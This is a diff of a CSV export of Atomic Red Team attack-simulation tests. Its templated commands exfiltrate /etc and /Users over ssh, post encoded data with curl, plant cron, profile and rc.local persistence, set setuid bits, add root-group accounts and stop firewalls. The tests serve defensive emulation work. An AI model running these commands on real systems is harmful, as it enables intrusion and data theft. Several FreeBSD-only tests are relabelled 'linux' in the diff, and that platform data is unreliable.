 ",sh,"dependencies.0.description: Check if rsync is installed.
@@ -12784,7 +12852,7 @@ input_arguments.computer_name.default: localhost
 T1033,System Owner/User Discovery,System Owner/User Discovery,2a9b677d-a230-44f4-ad86-782df1ef108c,"Identify System owner or users on an endpoint
 
 Upon successful execution, sh will stdout list of usernames.
-",freebsd,linux,macos,"users
+",linux,macos,,"users
 w
 who
 ",sh,,,,,,
@@ -12958,7 +13026,7 @@ input_arguments.curl_path.default: C:\Windows\System32\Curl.exe
 "
 T1071.001,Application Layer Protocol: Web Protocols,Malicious User Agents - Nix,2d7c471a-e887-4b78-b0dc-b0df1f2e0658,"This test simulates an infected host beaconing to command and control.
 Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
-",freebsd,linux,macos,"curl -s -A ""HttpBrowser/1.0"" -m3 #{domain}
+",linux,macos,,"curl -s -A ""HttpBrowser/1.0"" -m3 #{domain}
 curl -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 #{domain}
 curl -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 #{domain}
 curl -s -A ""*<|>*"" -m3 #{domain}
@@ -13117,7 +13185,7 @@ T1614.001,System Location Discovery: System Language Discovery,Discover System L
 
 Upon successful execution, the output will contain the environment variables that indicate
 the 5 character locale that can be looked up to correlate the language and territory.
-",freebsd,linux,,"locale
+",linux,,,"locale
 ",sh,,,,,,
 T1614.001,System Location Discovery: System Language Discovery,Discover System Language with localectl,07ce871a-b3c3-44a3-97fa-a20118fdc7c9,"Identify System language with the `localectl` command.
 
@@ -13148,7 +13216,7 @@ to run with a pattern match command e.g. `env | grep LANG`
 Note: `env` and `printenv` will usually provide the same results. `set` is
 also used as a builtin command that does not generate syscall telemetry but
 does provide a list of the environment variables.
-",freebsd,linux,,"env | grep LANG
+",linux,,,"env | grep LANG
 printenv LANG
 set | grep LANG
 ",sh,,,,sh,"dependencies.0.description: Check if printenv command exists on the machine
@@ -13214,7 +13282,7 @@ powerSQL -noninteractive -consoleoutput",powershell,,,,,,
 T1090.001,Proxy: Internal Proxy,Connection Proxy,0ac21132-4485-4212-a681-349e8a6637cd,"Enable traffic redirection.
 
 Note that this test may conflict with pre-existing system configuration.
-",freebsd,macos,linux,"export #{proxy_scheme}_proxy=#{proxy_server}
+",linux,macos,,"export #{proxy_scheme}_proxy=#{proxy_server}
 ",sh,,,"unset http_proxy
 unset https_proxy
 ",,,"input_arguments.proxy_server.description: Proxy server URL (host:port)
@@ -13447,7 +13515,7 @@ Powershell -noprofile
 Stop-Process -Name ""calculator""
 ",,,
 T1053.003,Scheduled Task/Job: Cron,Cron - Replace crontab with referenced file,435057fb-74b1-410e-9403-d81baf194f75,"This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.
-",freebsd,macos,linux,"crontab -l > /tmp/notevil
+",linux,macos,,"crontab -l > /tmp/notevil
 echo ""* * * * * #{command}"" > #{tmp_cron} && crontab #{tmp_cron}
 ",sh,,,"crontab /tmp/notevil
 ",,,"input_arguments.command.description: Command to execute
@@ -13486,7 +13554,7 @@ input_arguments.cron_script_name.default: persistevil
 
 "
 T1053.003,Scheduled Task/Job: Cron,Cron - Add script to /etc/cron.d folder,078e69eb-d9fb-450e-b9d0-2e118217c846,"This test adds a script to /etc/cron.d folder configured to execute on a schedule.
-",freebsd,,,"echo ""#{command}"" > /etc/cron.d/#{cron_script_name}
+",linux,,,"echo ""#{command}"" > /etc/cron.d/#{cron_script_name}
 ",sh,True,,"rm /etc/cron.d/#{cron_script_name}
 ",,,"input_arguments.command.description: Command to execute
 
@@ -13518,7 +13586,7 @@ input_arguments.cron_script_name.default: persistevil
 
 "
 T1105,Ingress Tool Transfer,rsync remote file copy (push),0fc6e977-cb12-44f6-b263-2824ba917409,"Utilize rsync to perform a remote file copy (push)
-",freebsd,linux,macos,"rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
+",linux,macos,,"rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
 ",sh,True,,,sh,"dependencies.0.description: rsync must be installed on the machine 
 
 dependencies.0.prereq_command: if [ -x ""$(command -v rsync)"" ]; then exit 0; else exit 1; fi
@@ -13551,7 +13619,7 @@ input_arguments.username.default: victim
 
 "
 T1105,Ingress Tool Transfer,rsync remote file copy (pull),3180f7d5-52c0-4493-9ea0-e3431a84773f,"Utilize rsync to perform a remote file copy (pull)
-",freebsd,linux,macos,"rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
+",linux,macos,,"rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
 ",sh,,,,sh,"dependencies.0.description: rsync must be installed on the machine 
 
 dependencies.0.prereq_command: if [ -x ""$(command -v rsync)"" ]; then exit 0; else exit 1; fi
@@ -13584,7 +13652,7 @@ input_arguments.username.default: adversary
 
 "
 T1105,Ingress Tool Transfer,scp remote file copy (push),83a49600-222b-4866-80a0-37736ad29344,"Utilize scp to perform a remote file copy (push)
-",freebsd,linux,macos,"scp #{local_file} #{username}@#{remote_host}:#{remote_path}
+",linux,macos,,"scp #{local_file} #{username}@#{remote_host}:#{remote_path}
 ",sh,,,,,,"input_arguments.remote_path.description: Remote path to receive scp
 
 input_arguments.remote_path.type: path
@@ -13611,7 +13679,7 @@ input_arguments.username.default: victim
 
 "
 T1105,Ingress Tool Transfer,scp remote file copy (pull),b9d22b9a-9778-4426-abf0-568ea64e9c33,"Utilize scp to perform a remote file copy (pull)
-",freebsd,linux,macos,"scp #{username}@#{remote_host}:#{remote_file} #{local_path}
+",linux,macos,,"scp #{username}@#{remote_host}:#{remote_file} #{local_path}
 ",sh,,,,,,"input_arguments.remote_host.description: Remote host to copy from
 
 input_arguments.remote_host.type: string
@@ -13638,7 +13706,7 @@ input_arguments.username.default: adversary
 
 "
 T1105,Ingress Tool Transfer,sftp remote file copy (push),f564c297-7978-4aa9-b37a-d90477feea4e,"Utilize sftp to perform a remote file copy (push)
-",freebsd,linux,macos,"sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
+",linux,macos,,"sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
 ",sh,,,,,,"input_arguments.remote_path.description: Remote path to receive sftp
 
 input_arguments.remote_path.type: path
@@ -13665,7 +13733,7 @@ input_arguments.username.default: victim
 
 "
 T1105,Ingress Tool Transfer,sftp remote file copy (pull),0139dba1-f391-405e-a4f5-f3989f2c88ef,"Utilize sftp to perform a remote file copy (pull)
-",freebsd,linux,macos,"sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
+",linux,macos,,"sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
 ",sh,,,,,,"input_arguments.remote_host.description: Remote host to copy from
 
 input_arguments.remote_host.type: string
@@ -13814,7 +13882,7 @@ input_arguments.local_path.default: %temp%\Atomic-license.txt
 
 "
 T1105,Ingress Tool Transfer,whois file download,c99a829f-0bb8-4187-b2c6-d47d1df74cab,"Download a remote file using the whois utility
-",freebsd,linux,macos,"timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} ""#{query}"" > #{output_file}
+",linux,macos,,"timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} ""#{query}"" > #{output_file}
 ",sh,False,,"rm -f #{output_file}
 ",,"dependencies.0.description: The whois and timeout commands must be present
 
@@ -14261,7 +14329,7 @@ input_arguments.payload.default: PathToAtomicsFolder/T1548.001/src/hello.c
 
 "
 T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Make and modify binary from C source (freebsd),dd580455-d84b-481b-b8b0-ac96f3b1dc4c,"Make, change owner, and change file attributes on a C source code file
-",freebsd,,,"cp #{payload} /tmp/hello.c
+",linux,,,"cp #{payload} /tmp/hello.c
 chown root /tmp/hello.c
 make /tmp/hello
 chown root /tmp/hello
@@ -14289,7 +14357,7 @@ input_arguments.file_to_setuid.default: /tmp/evilBinary
 
 "
 T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Set a SetUID flag on file (freebsd),9be9b827-ff47-4e1b-bef8-217db6fb7283,"This test sets the SetUID flag on a file in FreeBSD.
-",freebsd,,,"touch #{file_to_setuid}
+",linux,,,"touch #{file_to_setuid}
 chown root #{file_to_setuid}
 chmod u+xs #{file_to_setuid}
 ",sh,True,,"rm #{file_to_setuid}
@@ -14313,7 +14381,7 @@ input_arguments.file_to_setuid.default: /tmp/evilBinary
 
 "
 T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Set a SetGID flag on file (freebsd),1f73af33-62a8-4bf1-bd10-3bea931f2c0d,"This test sets the SetGID flag on a file in FreeBSD.
-",freebsd,,,"touch #{file_to_setuid}
+",linux,,,"touch #{file_to_setuid}
 chown root #{file_to_setuid}
 chmod g+xs #{file_to_setuid}
 ",sh,True,,"rm #{file_to_setuid}
@@ -14352,10 +14420,10 @@ input_arguments.file_to_setcap.default: /tmp/evilBinary
 
 "
 T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Do reconnaissance for files that have the setuid bit set,8e36da01-cd29-45fd-be72-8a0fcaad4481,"This test simulates a command that can be run to enumerate files that have the setuid bit set
-",freebsd,linux,,"find /usr/bin -perm -4000
+",linux,,,"find /usr/bin -perm -4000
 ",sh,,,,,,
 T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Do reconnaissance for files that have the setgid bit set,3fb46e17-f337-4c14-9f9a-a471946533e2,"This test simulates a command that can be run to enumerate files that have the setgid bit set
-",freebsd,linux,,"find /usr/bin -perm -2000
+",linux,,,"find /usr/bin -perm -2000
 ",sh,,,,,,
 T1112,Modify Registry,Modify Registry of Current User Profile - cmd,1324796b-d0f6-455a-b4ae-21ffee6aa6b9,"Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message ""The operation completed successfully.""
 will be displayed. Additionally, open Registry Editor to view the new entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced.
@@ -15027,7 +15095,7 @@ Upon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, 
 T1036.003,Masquerading: Rename System Utilities,Masquerading as FreeBSD or Linux crond process.,a315bfff-7a98-403b-b442-2ea1b255e556,"Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.
 
 Upon successful execution, sh is renamed to `crond` and executed.
-",freebsd,linux,,"cp /bin/sh /tmp/crond;
+",linux,,,"cp /bin/sh /tmp/crond;
 echo 'sleep 5' | /tmp/crond
 ",sh,,,"rm /tmp/crond
 ",,,
@@ -15229,7 +15297,7 @@ dependencies.0.get_prereq_command: echo """"
 
 ",
 T1562.004,Impair Defenses: Disable or Modify System Firewall,Stop/Start Packet Filter,0ca82ed1-0a94-4774-9a9a-a2c83a8022b7,"Stop the Packet Filter if installed.
-",freebsd,,,"service pf stop
+",linux,,,"service pf stop
 service pf disable
 ",sh,True,,"service pf enable
 service pf start
@@ -15281,7 +15349,7 @@ dependencies.0.get_prereq_command: echo """"
 
 ",
 T1562.004,Impair Defenses: Disable or Modify System Firewall,Add and delete Packet Filter rules,8b23cae1-66c1-41c5-b79d-e095b6098b5b,"Add and delete a rule on the Packet Filter (PF) if installed and enabled. 
-",freebsd,,,"echo ""block in proto tcp from 1.2.3.4 to any"" | pfctl -a pf-rules -f -
+",linux,,,"echo ""block in proto tcp from 1.2.3.4 to any"" | pfctl -a pf-rules -f -
 pfctl -a pf-rules -s rules
 ",sh,True,,"pfctl -a pf-rules -F rules
 sed -i """" '/anchor pf-rules/d'
@@ -15424,7 +15492,7 @@ input_arguments.restart.default: 0
 "
 T1098.004,SSH Authorized Keys,Modify SSH Authorized Keys,342cc723-127c-4d3a-8292-9c0c6b4ecadc,"Modify contents of <user-home>/.ssh/authorized_keys to maintain persistence on victim host. 
 If the user is able to save the same contents in the authorized_keys file, it shows user can modify the file.
-",freebsd,macos,linux,"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;
+",linux,macos,,"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;
 ",sh,False,,"unset ssh_authorized_keys
 ",,,
 T1047,Windows Management Instrumentation,WMI Reconnaissance Users,c107778c-dcf5-47c5-af2e-1d058a3df3ea,"An adversary might use WMI to list all local User Accounts. 
@@ -15653,7 +15721,7 @@ input_arguments.command_to_add.default: echo ""Hello from Atomic Red Team T1546.
 
 "
 T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc,Add command to .shrc,41502021-591a-4649-8b6e-83c9192aff53,"Adds a command to the .shrc file of the current user
-",freebsd,,,"echo '#{command_to_add}' >> ~/.shrc
+",linux,,,"echo '#{command_to_add}' >> ~/.shrc
 ",sh,,,"head -n '-2' ~/.shrc > /tmp/T1546.004
 mv /tmp/T1546.004 ~/.shrc
 ",,,"input_arguments.command_to_add.description: Command to add to the .shrc file
@@ -15664,7 +15732,7 @@ input_arguments.command_to_add.default: echo ""Hello from Atomic Red Team T1546.
 
 "
 T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc,Append to the system shell profile,694b3cc8-6a78-4d35-9e74-0123d009e94b,"An adversary may wish to establish persistence by executing malicious commands from the systems /etc/profile every time ""any"" user logs in.
-",freebsd,linux,,"echo '#{text_to_append}' >> /etc/profile
+",linux,,,"echo '#{text_to_append}' >> /etc/profile
 ",sh,True,,"sed -i ""s/# Atomic Red Team was here! T1546.004//"" /etc/profile
 ",,,"input_arguments.text_to_append.description: Text to append to the /etc/profile file
 
@@ -15674,7 +15742,7 @@ input_arguments.text_to_append.default: # Hello from Atomic Red Team T1546.004
 
 "
 T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc,Append commands user shell profile,bbdb06bc-bab6-4f5b-8232-ba3fbed51d77,"An adversary may wish to establish persistence by executing malicious commands from the users ~/.profile every time the ""user"" logs in.
-",freebsd,linux,,"echo '#{text_to_append}' >> ~/.profile
+",linux,,,"echo '#{text_to_append}' >> ~/.profile
 ",sh,False,,"sed -i ""s/# Atomic Red Team was here... T1546.004//"" ~/.profile
 ",,,"input_arguments.text_to_append.description: Text to append to the ~/.profile file
 
@@ -15706,7 +15774,7 @@ T1048,Exfiltration Over Alternative Protocol,Exfiltration Over Alternative Proto
 Remote to Local
 
 Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
-",macos,linux,freebsd,"ssh #{domain} ""(cd /etc && tar -zcvf - *)"" > ./etc.tar.gz
+",macos,linux,,"ssh #{domain} ""(cd /etc && tar -zcvf - *)"" > ./etc.tar.gz
 ",sh,,,,,,"input_arguments.domain.description: target SSH domain
 
 input_arguments.domain.type: url
@@ -15719,7 +15787,7 @@ T1048,Exfiltration Over Alternative Protocol,Exfiltration Over Alternative Proto
 Local to Remote
 
 Upon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.
-",macos,linux,freebsd,"tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
+",macos,linux,,"tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
 ",sh,,,,,,"input_arguments.user_name.description: username for domain
 
 input_arguments.user_name.type: string
@@ -15991,7 +16059,7 @@ input_arguments.file_to_delete.default: PathToAtomicsFolder\..\ExternalPayloads\
 "
 T1485,Data Destruction,FreeBSD/macOS/Linux - Overwrite file with DD,38deee99-fd65-4031-bec8-bfa4f9f26146,"Overwrites and deletes a file using DD.
 To stop the test, break the command with CTRL/CMD+C.
-",freebsd,linux,macos,"dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes
+",linux,macos,,"dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes
 ",sh,,,,,,"input_arguments.overwrite_source.description: Path of data source to overwrite with
 
 input_arguments.overwrite_source.type: path
@@ -16116,7 +16184,7 @@ input_arguments.base64_data.default: MTExLTExLTExMTE=
 
 "
 T1132.001,Data Encoding: Standard Encoding,Base64 Encoded data (freebsd),2d97c626-7652-449e-a986-b02d9051c298,"Utilizing a common technique for posting base64 encoded data.
-",freebsd,,,"echo -n 111-11-1111 | b64encode -r -
+",linux,,,"echo -n 111-11-1111 | b64encode -r -
 curl -XPOST #{base64_data}.#{destination_url}
 ",sh,,,,sh,"dependencies.0.description: Requires curl
 
@@ -16170,7 +16238,7 @@ input_arguments.key.default: abcdefghijklmnopqrstuvwxyz123456
 T1027.001,Obfuscated Files or Information: Binary Padding,Pad Binary to Change Hash - Linux/macOS dd,ffe2346c-abd5-4b45-a713-bf5f1ebd573a,"Uses dd to add a zero byte, high-quality random data, and low-quality random data to the binary to change the hash.
 
 Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
-",freebsd,macos,linux,"dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes
+",linux,macos,,"dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes
 dd if=/dev/random bs=1 count=1 >> #{file_to_pad} #adds high-quality random data
 dd if=/dev/urandom bs=1 count=1 >> #{file_to_pad} #adds low-quality random data
 ",sh,,,"rm #{file_to_pad}
@@ -16190,7 +16258,7 @@ input_arguments.file_to_pad.default: /tmp/evil-binary
 T1027.001,Obfuscated Files or Information: Binary Padding,Pad Binary to Change Hash using truncate command - Linux/macOS,e22a9e89-69c7-410f-a473-e6c212cd2292,"Uses truncate to add a byte to the binary to change the hash.
 
 Upon successful execution, truncate will modify `/tmp/evil-binary`, therefore the expected hash will change.
-",freebsd,macos,linux,"truncate -s +1 #{file_to_pad} #adds a byte to the file size
+",linux,macos,,"truncate -s +1 #{file_to_pad} #adds a byte to the file size
 ",sh,,,"rm #{file_to_pad}
 ",sh,"dependencies.0.description: The binary must exist on disk at specified location (#{file_to_pad})
 
@@ -16939,7 +17007,7 @@ input_arguments.package_installer.default: yum install -y xorg-x11-apps
 
 "
 T1113,Screen Capture,X Windows Capture (freebsd),562f3bc2-74e8-46c5-95c7-0e01f9ccc65c,"Use xwd command to collect a full desktop screenshot and review file with xwud
-",freebsd,,,"xwd -root -out #{output_file}
+",linux,,,"xwd -root -out #{output_file}
 xwud -in #{output_file}
 ",sh,,,"rm #{output_file}
 ",sh,"dependencies.0.description: Package with XWD and XWUD must exist on device
@@ -16973,7 +17041,7 @@ input_arguments.output_file.default: /tmp/T1113_desktop.png
 
 "
 T1113,Screen Capture,Capture Linux Desktop using Import Tool (freebsd),18397d87-38aa-4443-a098-8a48a8ca5d8d,"Use import command from ImageMagick to collect a full desktop screenshot
-",freebsd,,,"import -window root #{output_file}
+",linux,,,"import -window root #{output_file}
 ",sh,,,"rm #{output_file}
 ",,"dependencies.0.description: ImageMagick must be installed
 
@@ -17080,7 +17148,7 @@ sudo chmod +x /etc/rc.local
 ",bash,True,,"origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm $origfilename;fi
 ",,,
 T1037.004,Boot or Logon Initialization Scripts: Rc.common,rc.local (FreeBSD),2015fb48-8ab6-4fbf-928b-0b62de5c9476,"Modify rc.local
-",freebsd,,,"filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
+",linux,,,"filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
 printf '%s\n' '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local
 echo 'python3.9 -c ""import os, base64;exec(base64.b64decode(\""aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo=\""))""' | sudo tee -a /etc/rc.local
 printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.local
@@ -17143,7 +17211,7 @@ dependencies.0.get_prereq_command: (which yum && yum -y install net-tools)||(whi
 T1016,System Network Configuration Discovery,System Network Configuration Discovery (freebsd),7625b978-4efd-47de-8744-add270374bee,"Identify network configuration information.
 
 Upon successful execution, sh will spawn multiple commands and output will be via stdout.
-",freebsd,,,"if [ -x ""$(command -v arp)"" ]; then arp -a; else echo ""arp is missing from the machine. skipping...""; fi;
+",linux,,,"if [ -x ""$(command -v arp)"" ]; then arp -a; else echo ""arp is missing from the machine. skipping...""; fi;
 if [ -x ""$(command -v ifconfig)"" ]; then ifconfig; else echo ""ifconfig is missing from the machine. skipping...""; fi;
 if [ -x ""$(command -v netstat)"" ]; then netstat -Sp tcp | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo ""netstat is missing from the machine. skipping...""; fi;
 ",sh,,,,,,
@@ -17251,7 +17319,7 @@ controller of the targeted or compromised host. reference https://securelist.com
 ",windows,,,"nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%
 ",command_prompt,,,,,,
 T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chmod - Change file or folder mode (numeric mode),34ca1464-de9d-40c6-8c77-690adf36a135,"Changes a file or folder's permissions using chmod and a specified numeric mode.
-",freebsd,macos,linux,"chmod #{numeric_mode} #{file_or_folder}
+",linux,macos,,"chmod #{numeric_mode} #{file_or_folder}
 ",sh,,,,,,"input_arguments.numeric_mode.description: Specified numeric mode value
 
 input_arguments.numeric_mode.type: integer
@@ -17266,7 +17334,7 @@ input_arguments.file_or_folder.default: /tmp/AtomicRedTeam/atomics/T1222.002
 
 "
 T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chmod - Change file or folder mode (symbolic mode),fc9d6695-d022-4a80-91b1-381f5c35aff3,"Changes a file or folder's permissions using chmod and a specified symbolic mode.
-",freebsd,macos,linux,"chmod #{symbolic_mode} #{file_or_folder}
+",linux,macos,,"chmod #{symbolic_mode} #{file_or_folder}
 ",sh,,,,,,"input_arguments.symbolic_mode.description: Specified symbolic mode value
 
 input_arguments.symbolic_mode.type: string
@@ -17281,7 +17349,7 @@ input_arguments.file_or_folder.default: /tmp/AtomicRedTeam/atomics/T1222.002
 
 "
 T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chmod - Change file or folder mode (numeric mode) recursively,ea79f937-4a4d-4348-ace6-9916aec453a4,"Changes a file or folder's permissions recursively using chmod and a specified numeric mode.
-",freebsd,macos,linux,"chmod -R #{numeric_mode} #{file_or_folder}
+",linux,macos,,"chmod -R #{numeric_mode} #{file_or_folder}
 ",sh,,,,,,"input_arguments.numeric_mode.description: Specified numeric mode value
 
 input_arguments.numeric_mode.type: integer
@@ -17296,7 +17364,7 @@ input_arguments.file_or_folder.default: /tmp/AtomicRedTeam/atomics/T1222.002
 
 "
 T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chmod - Change file or folder mode (symbolic mode) recursively,0451125c-b5f6-488f-993b-5a32b09f7d8f,"Changes a file or folder's permissions recursively using chmod and a specified symbolic mode.
-",freebsd,macos,linux,"chmod -R #{symbolic_mode} #{file_or_folder}
+",linux,macos,,"chmod -R #{symbolic_mode} #{file_or_folder}
 ",bash,,,,,,"input_arguments.symbolic_mode.description: Specified symbolic mode value
 
 input_arguments.symbolic_mode.type: string
@@ -17353,7 +17421,7 @@ input_arguments.group.default: root
 
 "
 T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chown - Change file or folder mode ownership only,967ba79d-f184-4e0e-8d09-6362b3162e99,"Changes a file or folder's ownership only using chown.
-",freebsd,macos,linux,"chown #{owner} #{file_or_folder}
+",linux,macos,,"chown #{owner} #{file_or_folder}
 ",sh,,,,,,"input_arguments.owner.description: Username of desired owner
 
 input_arguments.owner.type: string
@@ -17394,7 +17462,7 @@ input_arguments.file_to_modify.default: /var/spool/cron/root
 "
 T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",chflags - Remove immutable file attribute,60eee3ea-2ebd-453b-a666-c52ce08d2709,"Remove's a file's `immutable` attribute using `chflags`.
 This technique was used by the threat actor Rocke during the compromise of Linux web servers.
-",freebsd,,,"touch #{file_to_modify}
+",linux,,,"touch #{file_to_modify}
 chflags simmutable #{file_to_modify}
 chflags nosimmutable #{file_to_modify}
 ",sh,,,,,,"input_arguments.file_to_modify.description: Path of the file
@@ -17426,7 +17494,7 @@ input_arguments.compiled_file.default: /tmp/T1222002
 
 "
 T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",Chmod through c script (freebsd),da40b5fe-3098-4b3b-a410-ff177e49ee2e,"chmods a file using a c script
-",freebsd,,,"#{compiled_file} /tmp/ T1222002
+",linux,,,"#{compiled_file} /tmp/ T1222002
 ",sh,,,,sh,"dependencies.0.description: Compile the script from (#{source_file}). Destination is #{compiled_file}
 
 dependencies.0.prereq_command: cc #{source_file} -o #{compiled_file}
@@ -17468,7 +17536,7 @@ input_arguments.compiled_file.default: /tmp/T1222002own
 
 "
 T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",Chown through c script (freebsd),eb577a19-b730-4918-9b03-c5edcf51dc4e,"chowns a file to root using a c script
-",freebsd,,,"#{compiled_file} #{source_file}
+",linux,,,"#{compiled_file} #{source_file}
 ",sh,True,,,sh,"dependencies.0.description: Compile the script from (#{source_file}). Destination is #{compiled_file}
 
 dependencies.0.prereq_command: cc #{source_file} -o #{compiled_file}
@@ -17499,7 +17567,7 @@ input_arguments.username.default: evil_user
 
 "
 T1136.001,Create Account: Local Account,Create a user account on a FreeBSD system,a39ee1bc-b8c1-4331-8e5f-1859eb408518,"Create a user via pw
-",freebsd,,,"pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account
+",linux,,,"pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account
 ",sh,True,,"rmuser -y #{username}
 ",,,"input_arguments.username.description: Username of the user to create
 
@@ -17575,7 +17643,7 @@ input_arguments.password.default: BetterWithButter
 
 "
 T1136.001,Create Account: Local Account,Create a new user in FreeBSD with `root` GID.,d141afeb-d2bc-4934-8dd5-b7dba0f9f67a,"Creates a new user in FreeBSD and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.
-",freebsd,,,"pw useradd #{username} -g 0 -d /root -s /bin/sh
+",linux,,,"pw useradd #{username} -g 0 -d /root -s /bin/sh
 echo ""#{password}"" | pw usermod #{username} -h 0
 ",sh,True,,"pw userdel #{username}
 ",,,"input_arguments.username.description: Username of the user to create
@@ -17608,6 +17676,12 @@ input_arguments.password.type: string
 input_arguments.password.default: T1136_pass
 
 "
+T1654,Log Enumeration,Get-EventLog To Enumerate Windows Security Log,a9030b20-dd4b-4405-875e-3462c6078fdc,"Uses the built-in PowerShell commandlet Get-EventLog to search for 'SYSTEM' keyword and saves results to a text file.
+
+This technique was observed in a [TheDFIRReport case](https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/) 
+where the threat actor enumerated the Windows Security audit log to determine user accounts and associated IPv4 addresses.
+
+Successful execution will save matching log events to the users temp folder.",windows,,,"powershell -c ""get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\T1654_events.txt""",powershell,True,,"powershell -c ""remove-item $env:temp\T1654_events.txt -ErrorAction Ignore""",,,
 T1547.009,Boot or Logon Autostart Execution: Shortcut Modification,Shortcut Modification,ce4fc678-364f-4282-af16-2fb4c78005ce,"This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;
 gci -path ""C:\Users"" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern ""exe"" | FL.
 Upon execution, calc.exe will be launched.
@@ -17656,7 +17730,7 @@ T1124,System Time Discovery,System Time Discovery - PowerShell,1d5711d6-655c-4a4
 ",windows,,,"Get-Date
 ",powershell,,,,,,
 T1124,System Time Discovery,System Time Discovery in FreeBSD/macOS,f449c933-0891-407f-821e-7916a21a1a6f,"Identify system time. Upon execution, the local computer system time and timezone will be displayed. 
-",freebsd,macos,,"date
+",linux,macos,,"date
 ",sh,,,,,,
 T1124,System Time Discovery,System Time Discovery W32tm as a Delay,d5d5a6b0-0f92-42d8-985d-47aafa2dd4db,"identifies DCRat delay time tactics using w32tm.
 https://research.splunk.com/endpoint/b2cc69e7-11ba-42dc-a269-59c069a48870/
@@ -17718,7 +17792,7 @@ T1027,Obfuscated Files or Information,Decode base64 Data into Script,197ed693-08
 
 Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` 
 and uname -v
-",freebsd,,,"cat /tmp/encoded.dat | b64decode -r > /tmp/art.sh
+",linux,,,"cat /tmp/encoded.dat | b64decode -r > /tmp/art.sh
 chmod +x /tmp/art.sh
 /tmp/art.sh
 ",sh,,,"rm /tmp/encoded.dat 
@@ -18949,7 +19023,7 @@ input_arguments.output_file.default: $HOME/data.zip
 
 "
 T1560.001,Archive Collected Data: Archive via Utility,Data Compressed - nix - gzip Single File,cde3c2af-3485-49eb-9c1f-0ed60e9cc0af,"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.
